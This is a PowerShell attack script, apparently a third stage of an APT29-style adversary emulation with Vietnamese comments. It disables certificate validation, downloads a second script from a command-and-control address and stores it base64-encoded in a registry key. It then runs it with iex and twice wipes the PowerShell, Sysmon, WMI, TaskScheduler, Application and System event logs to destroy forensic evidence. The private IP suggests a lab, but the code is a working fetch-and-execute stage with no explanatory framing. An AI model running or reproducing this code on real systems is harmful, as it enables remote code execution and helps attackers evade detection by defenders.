function Invoke-Stage3Main {
    [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    [Net.WebRequest]::DefaultWebProxy = $null

    $PublicDir = "C:\Users\Public\apt29"
    mkdir $PublicDir -Force -EA SilentlyContinue

    $C2 = "https://192.168.56.100:8443"

    # [A] Tai wmi_setup.ps1
    $wc = New-Object Net.WebClient
    $wc.Proxy = $null
    $PayloadText = $wc.DownloadString("$C2/wmi_setup.ps1")

    # [B] Ghi Registry
    $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($PayloadText))
    reg add "HKCU\Software\Classes\APT29Stage1" /v Payload /t REG_SZ /d $b64 /f | Out-Null

    # [C] Doc lai + Verify
    $readBack = (Get-ItemProperty 'HKCU:\Software\Classes\APT29Stage1').Payload
    if ($readBack -ne $b64) { return }

    # [D] Decode + chay
    $decoded = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($readBack))
    iex $decoded

    # =========================================================
    # [FINAL] Clear log lan cuoi — xoa 4100/4103 vua sinh
    # =========================================================
    Start-Sleep 8

    $finalClear = 'wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>nul & ' +
                  'wevtutil cl "Microsoft-Windows-TaskScheduler/Operational" 2>nul & ' +
                  'wevtutil cl "Microsoft-Windows-Sysmon/Operational" 2>nul & ' +
                  'wevtutil cl "Microsoft-Windows-WMI-Activity/Operational" 2>nul & ' +
                  'wevtutil cl "Application" 2>nul & ' +
                  'wevtutil cl "System" 2>nul'

    Start-Process cmd.exe -ArgumentList "/c", $finalClear -WindowStyle Hidden -Wait

    # Sleep + clear lan 2 (catch new events)
    Start-Sleep 5
    Start-Process cmd.exe -ArgumentList "/c", $finalClear -WindowStyle Hidden -Wait
}

Invoke-Stage3Main
